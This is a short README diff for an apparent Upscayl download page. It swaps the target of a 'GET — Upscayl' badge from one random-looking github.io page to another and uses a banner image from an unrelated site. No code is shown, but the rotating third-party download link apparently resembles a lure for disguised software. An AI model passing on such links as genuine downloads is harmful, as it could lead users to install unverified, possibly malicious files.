@@ -3,7 +3,7 @@
 
 ![Banner Placeholder](https://cares.vn/wp-content/uploads/2026/06/phan-mem-upscayl-1.jpg)
 
-[![GET — Upscayl](https://img.shields.io/badge/GET%20%E2%80%94%20Upscayl-0078D6?style=for-the-badge&logoColor=white)](https://lisarodriguezj632.github.io/.github/Upscayl-Image)
+[![GET — Upscayl](https://img.shields.io/badge/GET%20%E2%80%94%20Upscayl-0078D6?style=for-the-badge&logoColor=white)](https://osieelleholorasa.github.io/.github/Upscayl-Image)
 
 ---
 
